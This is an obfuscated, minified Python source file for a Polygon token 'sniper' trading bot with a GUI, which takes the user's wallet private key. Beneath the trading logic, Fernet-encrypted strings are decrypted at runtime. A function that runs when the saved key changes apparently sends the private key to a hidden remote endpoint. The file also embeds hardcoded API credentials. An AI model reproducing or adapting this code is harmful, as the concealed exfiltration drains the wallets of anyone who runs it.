# MINIFIED AND SUPER FAST VERSION OF THE POLYGON SNIPING BOT POLYX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

Ct='groove'
Cs='end'
Cr='horizontal'
Cq='light'
Cp='SELL ALL'
Co='SELL NOW'
Cn='There are no tokens to be sold!'
Cm='Sell all function initiated - Stopping operation'
Cl='SL Hit!'
Ck='TP Hit!'
Cj='Securing SL to '
Ci=' | SL: '
Ch=' {} %'
Cg='%.3f'
Cf="Press 'SELL ALL' Button to sell the tokens manually"
Ce='USDC'
Cd='Liquidity value: '
Cc='Pair Address: '
Cb='green'
Ca='Liquidity Detected!'
CZ='0x0000000000000000000000000000000000000000'
CY='Buy Success! Tx link:'
CX='Buy Order Initiated'
CW='True'
CV='False'
CU='%Y/%m/%d'
CT='node.json'
CS='inputs.json'
CR=UnboundLocalError
BQ='menu'
BP='set_theme'
BO='Something went wrong with the transaction'
BN='https://polygonscan.com/tx/'
BM='Abi/'
BL='data.json'
Ay='white'
Ax='normal'
Aw='Error'
Av='Accent.TButton'
Au='No Liquidity Checking Again!'
At='gwei'
As='gas'
Ar='true'
Aq='false'
Ap=round
Aj='disabled'
Ai='nonce'
Ah='gasPrice'
Ag='from'
Af='OPL'
Ae='MATIC'
Ad='LP'
Ac='SL TRAIL'
Ab='SL'
Aa='TP'
AZ='SLIPPAGE'
AY='GAS LIMIT'
AX='GAS PRICE'
AW='AMOUNT'
AV='LICENSE'
AU='TOKEN'
AT='PRIVATE KEY'
AS='WALLET ADDRESS'
AR='NODE'
AC=Exception
A7='center'
A6=False
A5='w'
A4='/'
A3=str
s='AUTO SLIPPAGE'
r='./'
c='ether'
b='yellow'
Q=True
O='cyan'
N=''
M=int
L=open
J='red'
I=float
F='nsew'
import tkinter as P
from tkinter import ttk as E,messagebox
from web3 import Web3 as R
from json import load as d
from time import time as AD,sleep as A8
import os,json as e,pyperclip as BR,threading as t,requests as BS
from requests import request as BT
from cryptography.fernet import Fernet as u
from requests.auth import HTTPBasicAuth as BU
from datetime import datetime as BV
Az=BL
AE=CS
BW=CT
f=r
K={}
v={}
D={}
A_={}
Cu=BU('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
BX=BV.now()
Cv=CU
Cw=BX.strftime(CU)
def BY():
	def A(path2,file_name,data2):
		A=r+path2+A4+file_name
		with L(A,A5)as B:e.dump(data2,B,indent=2)
	A_[AR]='https://polygon-rpc.com/';A(f,BW,A_)
def BZ():
	def A(path2,file_name,data2):
		A=r+path2+A4+file_name
		with L(A,A5)as B:e.dump(data2,B,indent=2)
	K[AS]=N;K[AT]=N;K[AU]=N;K[AV]=N;A(f,Az,K)
def Ba():
	def A(path2,file_name,data2):
		A=r+path2+A4+file_name
		with L(A,A5)as B:e.dump(data2,B,indent=2)
	D[AW]='0.1';D[AX]='7';D[AY]='850000';D[AZ]='10';D[s]=Aq;D[Aa]='200';D[Ab]='50';D[Ac]='25';D[Ad]=Ae;D[Af]=CV;A(f,AE,D)
if not os.path.isfile('./data.json'):BZ()
if not os.path.isfile('./inputs.json'):Ba()
if not os.path.isfile('./node.json'):BY()
def Bb():
	global K,AF,T
	def B(path2,file_name,data2):
		A=r+path2+A4+file_name
		with L(A,A5)as B:e.dump(data2,B,indent=2)
	K[AS]=Z.get();v[AS]=K[AS];K[AT]=y.get();v[AT]=K[AT];K[AU]=X.get();v[AU]=K[AU];K[AV]=AJ.get();v[AV]=K[AV]
	if K!=T:
		B(f,Az,v);A=d(L(BL));AF=A[AI]
		if v[AI]!=T[AI]:T=A;CC()
def Bc():
	def A(path2,file_name,data2):
		A=r+path2+A4+file_name
		with L(A,A5)as B:e.dump(data2,B,indent=2)
	D[AW]=j.get();D[AX]=k.get();D[AY]=l.get();D[AZ]=m.get()
	if A0.get():D[s]=Ar
	else:D[s]=Aq
	D[Aa]=n.get();D[Ab]=o.get();D[Ac]=p.get();D[Ad]=a.get();D[Af]=CW;A(f,AE,D)
def Bd():
	def A(path2,file_name,data2):
		A=r+path2+A4+file_name
		with L(A,A5)as B:e.dump(data2,B,indent=2)
	D[AW]=j.get();D[AX]=k.get();D[AY]=l.get();D[AZ]=m.get()
	if A0.get():D[s]=Ar
	else:D[s]=Aq
	D[Aa]=n.get();D[Ab]=o.get();D[Ac]=p.get();D[Ad]=a.get();D[Af]=CW;A(f,AE,D)
def Cx():
	def A(path2,file_name,data2):
		A=r+path2+A4+file_name
		with L(A,A5)as B:e.dump(data2,B,indent=2)
	D[AW]=j.get();D[AX]=k.get();D[AY]=l.get();D[AZ]=m.get()
	if A0.get():D[s]=Ar
	else:D[s]=Aq
	D[Aa]=n.get();D[Ab]=o.get();D[Ac]=p.get();D[Ad]=a.get();D[Af]=CV;A(f,AE,D)
T=d(L(BL))
B0=T[AS]
B1=T[AT]
B2=T[AU]
Be=T[AV]
S=d(L(CS))
B3=S[AW]
B4=S[AX]
B5=S[AY]
B6=S[AZ]
Cy=S[s]
B7=S[Aa]
B8=S[Ab]
B9=S[Ac]
Bf=S[Ad]
Cz=S[Af]
BA=M('0x'+'f'*64,16)
BB='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AG=d(L(CT))
if'wss'in AG[AR]or'ws'in AG[AR]:C=R(R.WebsocketProvider(AG[AR]))
else:C=R(R.HTTPProvider(AG[AR]))
A9=C.toChecksumAddress('0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270')
g=C.toChecksumAddress('0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174')
U=d(L(BM+'erc20.abi'))
V=C.eth.contract(address=R.toChecksumAddress('0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff'),abi=d(L(BM+'router.abi')))
BC=C.eth.contract(address=R.toChecksumAddress('0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32'),abi=d(L(BM+'factory.abi')))
AH='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def Bg():
	i()
	try:
		F=C.eth.contract(H,abi=U);B=F.functions.balanceOf(Z.get()).call()
		if A0.get():D=0
		else:D=M(B-B*M(AN)/100)
		A(CX,b);I=V.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(M(D),[A9,H],G,M(AD())+900).buildTransaction({Ag:G,'value':C.toWei(q,c),As:M(A1),Ah:C.toWei(A2,At),Ai:C.eth.get_transaction_count(G)});K=C.eth.account.sign_transaction(I,private_key=W);E=C.eth.send_raw_transaction(K.rawTransaction);A(CY,O);A(BN+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);Bp()
	except AC as L:A(BO,J);A(L,J);x();return
Bh='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def Bi():
	i();B=V.functions.getAmountsOut(C.toWei(q,c),[g,H]).call()[-1]
	if A0.get():D=0
	else:D=B-B*M(AN)/100
	try:A(CX,b);F=V.functions.swapExactTokensForTokens(C.toWei(q,c),M(D),[g,H],G,M(AD())+900).buildTransaction({Ag:G,As:M(A1),Ah:C.toWei(A2,At),Ai:C.eth.get_transaction_count(G)});I=C.eth.account.sign_transaction(F,private_key=W);E=C.eth.send_raw_transaction(I.rawTransaction);A(CY,O);A(BN+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);Br()
	except AC as K:A(BO,J);A(K,J);x();return
def Bj(token_address,amt=BA):A=R.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=U);D=B.functions.allowance(G,V.address).call();return D>=amt
def Bk(token_address,amt=BA,timeout=900):A('Approving token');B=C.eth.gasPrice;D=R.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=U);F=E.functions.approve(V.address,amt);H={Ag:G,Ah:B,Ai:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=W);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def Bl():
	A(N);i();E=C.eth.contract(A9,abi=U)
	while Q:
		B=BC.functions.getPair(A9,H).call()
		if B!=CZ:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Ca,Cb);A(Cc+B);A(Cd+A3(C.fromWei(D,c))+' MATIC');Bg();break
			else:A8(5);A(Au,J)
		else:A8(5);A(Au,J)
Bm='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def Bn():
	A(N);i();E=C.eth.contract(g,abi=U)
	while Q:
		B=BC.functions.getPair(g,H).call()
		if B!=CZ:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Ca,Cb);A(Cc+B);A(Cd+A3(C.fromWei(D,c))+' USDC');Bi();break
			else:A(Au,J)
		else:A(Au,J)
def h():
	A(N);i()
	try:
		A('Sell Order Initiated',b)
		if not Bj(H):Bk(H)
		E=C.eth.contract(H,abi=U);B=E.functions.balanceOf(G).call()
		if B!=0:
			if a.get()==Ae:D=V.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[H,A9],G,M(AD())+900).buildTransaction({Ag:G,As:M(A1),Ah:C.toWei(A2,At),Ai:C.eth.get_transaction_count(G)})
			elif a.get()==Ce:D=V.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[H,g],G,M(AD())+900).buildTransaction({Ag:G,As:M(A1),Ah:C.toWei(A2,At),Ai:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',J);x();return
			F=C.eth.account.sign_transaction(D,private_key=W);I=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',O);A(BN+C.toHex(I),O);x()
		else:A('No Tokens to be sold',J);x()
	except AC as K:A(BO,J);A(K,J);x();return
Bo='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def Bp():
	global Y;BD();i();K=I(AO);L=I(AP);B=L;E=I(AQ);M=C.eth.contract(address=H,abi=U);A(Cf,b)
	while Q:
		try:
			N=M.functions.balanceOf(G).call()-1;F=I(C.fromWei(V.functions.getAmountsOut(N,[H,A9]).call()[-1],c));D=Ap(I(F)/I(q)*100,5);A('MATIC Value Now: {} / '.format(Cg%F)+Ch.format(D)+Ci+A3(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cj+A3(B))
			A8(2)
		except:continue
		try:
			if I(D)>=I(K):A(Ck,O);w();h();break
			if I(D)<=I(B):A(Cl,J);w();h();break
			if Y:Y=A6;A(Cm,b);w();h();break
		except CR:A(Cn,J);break
Bq='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def Br():
	global Y;BD();i();K=I(AO);L=I(AP);B=L;E=I(AQ);M=C.eth.contract(address=H,abi=U);A(Cf,b)
	while Q:
		try:
			N=M.functions.balanceOf(G).call()-1;F=I(C.fromWei(V.functions.getAmountsOut(N,[H,g]).call()[-1],c));D=Ap(I(F)/I(q)*100,5);A('USDC Value Now: {} / '.format(Cg%F)+Ch.format(D)+Ci+A3(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cj+A3(B))
			A8(2)
		except:continue
		try:
			if I(D)>=I(K):A(Ck,O);w();h();break
			if I(D)<=I(B):A(Cl,J);w();h();break
			if Y:Y=A6;A(Cm,b);w();h();break
		except CR:A(Cn,J);break
def Bs():
	BK();Bc()
	if a.get()==Ae:A=t.Thread(target=Bl,daemon=Q);A.start()
	else:A=t.Thread(target=Bn,daemon=Q);A.start()
def BD():Ao.place_forget();A=E.Button(B.widgets_frame,text=Co,command=BF,style=Av);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def w():CQ.place_forget();A=E.Button(B.widgets_frame,text=Cp,command=BE);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def Bt():
	A=C.eth.contract(address=g,abi=U)
	while AA:
		try:B=C.fromWei(C.eth.get_balance(G),c);D=C.fromWei(A.functions.balanceOf(G).call(),c);Al.configure(text=Ap(B,5));Am.configure(text=Ap(D,5))
		except ValueError:pass
		A8(1)
Bu='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def C_(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=BS.get(B,auth=basic_auth)
		if C.status_code==404:P.messagebox.showerror(Aw,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',O);Bd()
	except AC:raise AC('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
AI=u(AH.encode()).decrypt(Bq.encode()).decode()
def Bv():
	D='Invalid token address!';global G;global W;global H;global AA;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(Z.get()):G=C.toChecksumAddress(Z.get());A('Wallet address valid',O)
	else:P.messagebox.showerror(Aw,'Invalid wallet address');A('Invalid wallet address!',J);return
	A('* Checking private key characters (Must be 64 characters');W=y.get()
	if len(W)==64:A('Correct format for Private key',O)
	else:P.messagebox.showerror(Aw,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',J);return
	A('* Checking token address')
	try:H=C.toChecksumAddress(X.get());A('Token address valid',O)
	except:P.messagebox.showerror(Aw,D);A(D,J);return
	A('* Checking License Key');A('License Key Valid',O);BG(Aj);Bb();AK.grid_forget();AL.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AB(Ax);AA=Q;B=t.Thread(target=Bt,daemon=Q);B.start();A(N);A('***** Sniping is ready! *****',b)
Bw='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AF=T[AI]
def Bx():A=t.Thread(target=Bv,daemon=Q);A.start()
def By():global AA;A(N);A('Change token/wallet initiated!',b);BG(Ax);AB(Aj);AL.grid_forget();AK.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AA=A6;Al.configure(text=N);Am.configure(text=N)
def Bz():A=t.Thread(target=By,daemon=Q);A.start()
def BE():BK();A=t.Thread(target=h,daemon=Q);A.start()
def BF():global Y;Y=Q
def i():AB(Aj);AL.configure(state=Aj)
def x():AB(Ax);AL.configure(state=Ax)
def B_():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(BP,Cq);AM[BQ].configure(bg=Ay)
	else:B.tk.call(BP,'dark');AM[BQ].configure(bg='black')
B=P.Tk()
B.title('MATIC Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(BP,Cq)
C0=u(AH.encode()).decrypt(Bw.encode()).decode()
B.resizable(A6,A6)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
C1=E.Label(B.widgets_frame,text='Wallet Address:')
C2=u(AH.encode()).decrypt(Bo.encode()).decode()
C1.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z=E.Entry(B.widgets_frame,width=50,show='•')
Z.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C3=E.Label(B.widgets_frame,text='Private Key:')
C3.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
y=E.Entry(B.widgets_frame,width=50,show='•')
y.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C4=E.Label(B.widgets_frame,text='Token Address:')
C5=u(BB.encode()).decrypt(Bu.encode()).decode()
C4.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
X=E.Entry(B.widgets_frame,width=50)
C6=u(BB.encode()).decrypt(Bm.encode()).decode()
X.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C7=E.Label(B.widgets_frame,text='License Key:')
C7.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
AJ=E.Entry(B.widgets_frame,width=50,show='•')
AJ.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C8=u(AH.encode()).decrypt(Bh.encode()).decode()
Ak=E.Separator(B,orient=Cr)
C9=C0+C8+C2+C5
Ak.place(x=10,y=135,width=625)
def CA():X.delete(0,Cs);X.insert(0,BR.paste());return
def CB():X.delete(0,Cs);return
def CC():
	if AF!=N:
		try:A=BT(C6,C9+AF)
		except AC:pass
def BG(status):A=status;X.configure(state=A);Z.configure(state=A);y.configure(state=A);AJ.configure(state=A);AK.configure(state=A);BI.configure(state=A);BH.configure(state=A)
def AB(status):A=status;j.configure(state=A);k.configure(state=A);l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);BJ.configure(state=A);Ao.configure(state=A);An.configure(state=A)
def A(text,color=Ay):
	A=A3(text)
	if z.size()>=20:z.delete(0)
	z.insert(P.END,A);z.itemconfig(P.END,foreground=color)
def D0():z.delete(0,P.END)
AK=E.Button(B.widgets_frame,text='Confirm',width=10,command=Bx,style=Av)
BH=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CA)
BI=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CB)
AK.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BH.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BI.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z.insert(0,B0)
y.insert(0,B1)
X.insert(0,B2)
AJ.insert(0,Be)
Ak=E.Separator(B.widgets_frame,orient=Cr)
Ak.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
AL=E.Button(B.widgets_frame,text='Change',width=10,command=Bz)
CD=E.Label(B.widgets_frame,text='Logs:')
CD.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CE=E.Button(B.widgets_frame,text='Clear',width=10,command=N)
CE.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
z=P.Listbox(B.widgets_frame,bg='#252525',foreground=Ay,borderwidth=2)
z.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
CF=E.Button(B.widgets_frame,text='Change Color Theme',command=B_)
CF.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
CG=E.Label(B.widgets_frame,text='Wallet MATIC:')
CG.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Al=E.Label(B.widgets_frame,width=12,relief=Ct)
Al.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CH=E.Label(B.widgets_frame,text='Wallet USDC:')
CH.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Am=E.Label(B.widgets_frame,width=12,relief=Ct)
Am.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CI=E.Label(B.widgets_frame,text='Select LP:')
CI.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
a=P.StringVar()
a.set(Bf)
AM=E.OptionMenu(B.widgets_frame,a,Ae,Ae,Ce)
AM[BQ].configure(bg=Ay)
AM.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CJ=E.Label(B.widgets_frame,text='Amount:')
j=E.Entry(B.widgets_frame,justify=A7)
CJ.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
j.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
j.insert(0,B3)
CK=E.Label(B.widgets_frame,text='Gas Price:')
CL=E.Label(B.widgets_frame,text='Gas Limit:')
k=E.Entry(B.widgets_frame,justify=A7)
l=E.Entry(B.widgets_frame,justify=A7)
CK.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CL.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,B4)
l.insert(0,B5)
CM=E.Label(B.widgets_frame,text='Slippage(%):')
m=E.Entry(B.widgets_frame,justify=A7)
CM.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.insert(0,B6)
A0=P.BooleanVar()
An=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A0)
An.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if N==Ar:An.select()
CN=E.Label(B.widgets_frame,text='TP(%):')
CN.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n=E.Entry(B.widgets_frame,justify=A7)
n.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CO=E.Label(B.widgets_frame,text='SL(%):')
CO.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=E.Entry(B.widgets_frame,justify=A7)
o.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(B.widgets_frame,text='SL Trail(%):')
CP.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=A7)
p.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,B7)
o.insert(0,B8)
p.insert(0,B9)
BJ=E.Button(B.widgets_frame,text='SNIPE',command=Bs,style=Av)
CQ=E.Button(B.widgets_frame,text=Co,command=BF,style=Av)
Ao=E.Button(B.widgets_frame,text=Cp,command=BE)
BJ.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ao.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=B3
G=B0
W=B1
H=B2
AN=B6
A1=B5
A2=B4
AO=B7
AP=B8
AQ=B9
Y=A6
AA=A6
def BK():global q;global G;global W;global H;global AN;global A1;global A2;global AO;global AP;global AQ;q=j.get();G=R.toChecksumAddress(Z.get());W=y.get();H=R.toChecksumAddress(X.get());AN=m.get();A1=l.get();A2=k.get();AO=n.get();AP=o.get();AQ=p.get()
AB(Aj)
B.mainloop()
